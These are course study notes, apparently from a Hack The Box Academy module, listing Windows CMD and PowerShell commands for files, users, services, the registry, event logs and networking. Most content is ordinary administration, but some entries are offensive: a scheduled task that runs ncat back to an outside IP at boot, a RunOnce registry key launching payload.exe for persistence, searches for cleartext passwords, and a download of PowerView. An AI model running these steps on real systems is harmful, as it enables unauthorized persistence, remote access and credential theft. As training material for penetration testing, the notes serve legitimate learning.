# Introduction to Windows Command Line

1. [CMD](#cmd)
1. [PowerShell](#powershell)

## CMD

* Basic commands:

    ```cmd
    dir
    # list directory contents

    help
    # list built-in commands

    help time
    # help details for 'time' command

    doskey /history
    # view command history

    cd
    # print current dir

    cd C:\Users\htb\Pictures
    # move to another dir
    # 'chdir' can also be used

    tree /F
    # lists dir and sub-dir recursively
    # /F to list files

    md new-dir
    # make new dir
    # 'mkdir' can also be used

    rd new-dir
    # delete empty dir
    # 'rmdir' can also be used

    rd /S new-dir
    # delete dir and its contents
    ```

* Working with files:

    ```cmd
    copy test.txt C:\Users\htb\Downloads\test.txt
    # copy dir/file

    move example C:\Users\htb\Documents\example
    # move dir/file

    xcopy C:\Users\htb\Documents\example C:\Users\htb\Desktop\ /E
    # similar to 'move'
    # /E to include empty dir

    robocopy C:\Users\htb\Desktop C:\Users\htb\Documents\
    # similar to 'move' and 'xcopy'

    more secrets.txt
    # show file contents in pager
    # use /S to remove blank space

    type secrets.txt
    # print file contents

    type passwords.txt >> secrets.txt
    # append file contents to another file - using redirection

    echo test string > check.txt
    # create and write to file

    ren check.txt test.txt
    # rename file

    ping 1.1.1.1 & type test.txt
    # runs 'ping' first, then 'type' command
    # '&' does not check if the command worked or not

    ping 1.1.1.1 && type test.txt
    # '&&' is state-dependent, and will work only if first command worked

    del test.txt
    # delete file
    # 'erase' can also be used

    del /A:R *
    # delete all read-only files in current dir
    ```

* System information:

    ```cmd
    systeminfo
    # general system info

    hostname
    # hostname of box

    ver
    # version

    ipconfig
    # network info
    # use /all for verbose info

    arp /a
    # shows ARP cache

    whoami
    # username

    whoami /priv
    # current user's privileges

    whoami /groups
    # current user's groups

    net user
    # show all users

    net localgroup
    # show all groups
    # if we are on DC, we can run 'net group'

    net share
    # check shared resources

    net view
    # check shared resources in env
    ```

* Finding files:

    ```cmd
    where test.txt
    # searches for file in env var path

    where /R C:\Users\ test.txt
    # searches for file recursively in given path, can use wildcards

    find "password" "C:\Users\student\not-passwords.txt"
    # search for string in a file
    # 'find' cannot use wildcards - for that, we can use 'findstr'

    find /N /I /V "IP Address" example.txt
    # /V to search with 'Not' clause - to show any line without the given string
    # /N to show line numbers
    # /I for case insensitive

    comp file1.md file2.md
    # compare files, byte-to-byte

    fc passwords.txt mod.txt /N
    # compare files, easier to check
    # /N for line number

    sort.exe file1.md /O sort1.md
    # sorts content
    # /O to save output to a file
    # use /unique to remove duplicate entries
    ```

* Environment variables:

    ```cmd
    # env variables are referred as %var_name%
    # these vars can be local or global
    # the scope can be for system, user or process

    set
    # print all env vars on system

    set %SYSTEMROOT%
    # print value of specific var

    echo %PATH%
    # print value of specific var

    # 'set' can be used to modify vars only in current CMD session
    # 'setx' can be used to modify vars permanently, via changes in registry
    # both have similar syntax

    set DCIP=172.16.5.2
    # create an env var

    setx DCIP 172.16.5.2
    # create an env var using 'setx'

    setx DCIP 172.16.5.5
    # modify env var using 'setx'

    setx DCIP ""
    # remove env var, by clearing its value
    ```

* Managing services:

    ```cmd
    sc query type= service
    # check all active services
    # the spacing for params is important

    sc query windefend
    # check for Windows Defender service

    sc stop Spooler
    # stop a particular service

    sc start Spooler
    # start a particular service

    # we can modify services using 'config' param
    # changes will be applied only after restarting the service
    ```

    ```cmd
    # disable Windows updates using sc
    # this requires elevated permissions

    sc query wuauserv
    # windows update service
    # currently stopped

    sc query bits
    # background intelligent transfer service
    # running

    sc stop bits
    # stop this service to stop downloading updates

    sc config wuauserv start= disabled
    # disable windows update service

    sc config bits start= disabled
    # disable bits

    # verify the services are disabled
    sc start wuauserv
    sc start bits
    ```

    ```cmd
    # other methods to query services

    tasklist /svc
    # list services running under each process

    net start
    # list running services
    # similar to 'sc'

    wmic service list brief
    # list all existing services and its info
    ```

* Scheduled tasks:

    ```cmd
    schtasks /query /v /fo list
    # 'query' action to check for scheduled tasks
    # /v for verbose
    # /fo for formatting option - set to list

    schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
    # 'create' action to schedule a task to run
    # /sc sets the schedule type - onstart in this case
    # /tn for task name
    # /tr for task trigger
    # this scheduled task is for a shell callback every time the host boots up

    schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
    # 'change' action to change task properties
    # /ru to set user account under which the task runs
    # /rp to set user password for the user account
    # this scheduled task is to update the shell callback, in case we get local admin password, for example

    schtasks /query /tn "My Secret Task" /V /fo list
    # verify the task is modified
    # use /run to kick off the task immediately

    schtasks /delete /tn "My Secret Task"
    # delete a scheduled task
    ```

## PowerShell

* Basic commands:

    ```ps
    Get-Help
    # help function
    # can be used for other cmdlets too

    Get-Help Import-Module

    Update-Help
    # updates help info

    Get-Location
    # current working dir

    Get-ChildItem
    # list contents of current dir

    Set-Location C:\Users\htb\Documents
    # move to another dir

    Get-Content test.txt
    # print file contents

    Get-Command
    # list all cmdlets

    Get-Command -verb get
    # filter cmdlets to check for 'Get' format cmdlets

    Get-Command -noun windows*
    # filter cmdlets to check for '-Windows*' format cmdlets

    Get-History
    # session history

    get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    # view PSReadLine history - PS history for all sessions
    # file path is '$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine'

    Get-Alias
    # list aliases for cmdlets - includes built-in and custom aliases

    Set-Alias -Name gh -Value Get-Help
    # set alias for a specific cmdlet

    Import-Module .\PowerSploit.psd1
    # import a PS module file

    Get-ExecutionPolicy
    # show policy state
    # if it is 'Restricted', we cannot import modules or run scripts

    Set-ExecutionPolicy undefined
    # modify policy state so that we can run scripts

    Set-ExecutionPolicy -scope Process
    # we can set execution policy at process level, so that it is reverted to default once PS session ends

    Get-Command -Module PowerSploit
    # check available cmdlets in a module
    ```

* User & group management:

    ```ps
    Get-LocalUser
    # get local users

    New-LocalUser -Name "JLawrence" -NoPassword
    # create a new user
    # -NoPassword so that user can login without password

    $Password = Read-Host -AsSecureString

    # modify user details
    Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO Eaglefang"

    Get-LocalGroup
    # show local groups

    Get-LocalGroupMember -Name "Users"
    # group members

    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
    # add to local group
    ```

    ```ps
    # for AD, we need to install the ActiveDirectory module
    Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online

    Get-Module -Name ActiveDirectory -ListAvailable
    # verify the AD module is listed

    Get-ADUser -Filter *
    # get domain users

    Get-ADUser -Identity TSilver
    # get specific domain user

    Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
    # search AD users based on attributes

    New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
    # create a new AD user
    # it prompts us to enter a password via 'Read-Host'

    Set-ADUser -Identity "MTanaka" -Description "change"
    # modify AD user
    ```

* Files & directories:

    ```ps
    New-Item -name "SOP" -type directory
    # create new folder
    # we can also use 'mkdir'

    Get-ChildItem
    # list dir

    New-Item -name "README.md" -type file
    # create new file

    Add-Content .\README.md "Test"
    # edit file

    Rename-Item .\README.md -NewName README1.md
    # rename file

    get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}
    # rename multiple files
    ```

* Finding & filtering content:

    ```ps
    # in powershell, everything is an object

    # check the properties/methods of a user
    Get-LocalUser administrator | get-member

    # output all properties - which make up the user object
    Get-LocalUser administrator | Select-Object -Property *

    Get-LocalUser * | Select-Object -Property Name,PasswordLastSet
    # filtering properties

    Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled
    # sorting & grouping based on properties

    get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl
    # sorting & filtering services

    # 'Where-Object' aka 'where' can be used for finding content
    Get-Service | where DisplayName -like '*Defender*'

    Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *
    # get service details & properties

    Get-Process | sort | unique | measure-object
    # count number of unique processes
    # pipe (|) can be used to concatenate commands

    # pipeline chain operators - && (AND), || (OR) - can also be used
    ```

    ```ps
    Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse
    # recursive search in a folder

    Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}
    # search only for text files

    Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
    # search for multiple file types

    Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"
    # search query using 'Select-String' aka 'sls'
    # this hunts for creds or cleartext passwords in text files

    et-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName"
    # search for creds in multiple file types
    ```

* Services:

    ```ps
    # Windows has 3 types of services - Local, Network & System Services

    # check service cmdlets
    Get-Help *-Service

    Get-Service | ft DisplayName, Status
    # check services

    Get-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status
    # check for services related to 'Defender'

    Start-Service WinDefend
    # start a service

    get-service WinDefend
    # check specific service

    Stop-Service Spooler
    # stop a service

    get-service spooler | Select-Object -Property Name, StartType, Status, DisplayName
    # this shows StartType is set to 'automatic'

    Set-Service -Name Spooler -StartType Disabled
    # modify a service
    ```

    ```ps
    get-service -ComputerName ACADEMY-ICL-DC
    # remotely query services

    Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}
    # filtering output to check for running services

    invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}
    # runs the command enclosed in 'ScriptBlock {}' on multiple computers
    # this is to check Defender service on multiple machines
    ```

* Windows Registry:

    ```ps
    Get-ChildItem C:\Windows\System32\config\
    # path for root registry keys

    Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
    # query registry entries
    # this example shows apps that launch on startup when user logs in

    Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
    # recursive search

    Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    # Get-ItemProperty fetches the properties of the object, so we do not need to add a filter
    # this example provides list of apps and their binary paths

    reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
    # we can use 'reg.exe' to query registry keys as well

    REG QUERY HKCU /F "Password" /t REG_SZ /S /K
    # searching for password strings in registry
    # /t to set value type, where REG_SZ indicates string
    # /s for recursive search
    # /k to search only through key names
    ```

    ```ps
    New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey
    # create a new registry key
    # this registry key stores apps that run once after user logs in - useful for persistence

    New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"
    # set value for newly created key

    # we can configure the same using 'reg.exe' too
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"

    Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"
    # delete registry entry
    ```

* Windows Event Log:

    ```ps
    # Windows Event Log is handled by 'EventLog' services, and it runs inside service host process svchost.exe

    ls C:\Windows\System32\winevt\logs
    # event log '.evtx' files are stored here

    # we can use wevtutil (in cmd) or Get-WinEvent to query Event Logs

    wevtutil el
    # enumerate log sources and names

    wevtutil gl "Windows PowerShell"
    # get log info for a specific log name

    wevtutil gli "Windows PowerShell"
    # get log file metadata

    wevtutil qe Security /c:5 /rd:true /f:text
    # query last 5 most recent events from Security log in text format

    wevtutil epl System C:\system_export.evtx
    # export events

    # using Get-WinEvent cmdlet
    Get-WinEvent -ListLog *
    # list all logs

    Get-WinEvent -ListLog Security
    # Security log details

    Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
    # query for last 5 events (newest by default)

    Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
    # check for specific event IDs
    # event ID 4625 is for logon failures

    Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message
    # check events with specific info level
    # level 1 is for critical events
    ```

* Networking Management:

    ```ps
    ipconfig
    # basic network info

    ipconfig /all
    # all network info

    arp -a
    # check ARP entries

    nslookup ACADEMY-ICL-DC
    # lookup domain names

    netstat -an
    # check open ports on host

    get-netIPInterface
    # get all network adapter properties

    get-netIPAddress -ifIndex 25
    # get adapter info for a specific interface - index from prev output

    Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled
    # modify interface

    Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24
    # modify IP

    Restart-NetAdapter -Name 'Ethernet 3'
    # restart adapter

    Test-NetConnection
    # checks internet connection via ping test
    ```

    ```ps
    # we can configure the host for remote access via SSH

    Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
    # check if the OpenSSH server & client apps are installed

    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
    # install SSH client

    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    # install SSH server

    Start-Service sshd
    # start ssh service

    Set-Service -Name sshd -StartupType 'Automatic'
    # config startup settings
    ```

    ```ps
    # winrm can also be enabled for remote access

    winrm quickconfig
    # follow the prompts for setup

    Test-WSMan -ComputerName "10.129.224.248"
    # test remote access
    # we can use Enter-PSSession for remote access
    ```

* Interacting with Web:

    ```ps
    Get-Help Invoke-WebRequest
    # aliased to wget, iwr, curl

    Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member
    # GET request with iwr
    # Get-Member to inspect the output methods of this object (response)

    # we can filter this list of properties
    Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images
    # shows list of images from site

    Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent
    # raw content of webpage

    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
    # downloading files

    # if iwr is restricted, we can use other commands

    (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
    # Net.WebClient can be used to download files
    ```

* Scripting & Automation:

    ```ps
    # to create a PowerShell module, we first need a directory within the path '$env:PSModulePath'

    mkdir quick-recon

    New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru
    # create a manifest file for the module, uses default values
    # -PassThru to print the file output
    # all lines in manifest files are optional, except for 'ModuleVersion'

    ni quick-recon.psm1 -ItemType file
    # using New-Item to create empty script file
    ```

    ```ps
    import-module ActiveDirectory

    # Comment-based help section

    <# 
    .Description  
    This function performs some simple recon tasks for the user with the 'Get-Recon' command
    #>
    function Get-Recon {  
        $Hostname = $env:ComputerName
        $IP = ipconfig
        $Domain = Get-ADDomain
        $Users = Get-ChildItem C:\Users\
        
        # Create a new file to place our recon results in
        new-Item ~\Desktop\recon.txt -ItemType File

        $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users

        Add-Content ~\Desktop\recon.txt $Vars
    } 

    Export-ModuleMember -Function Get-Recon -Variable Hostname
    # this specifies which functions and variables are available to user when module is imported
    # by default, all functions are exported, but variables & aliases are not
    ```

    ```ps
    # using the module
    Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1'

    get-module
    # confirm the module is loaded into the session

    get-help get-recon
    # shows help note
    ```
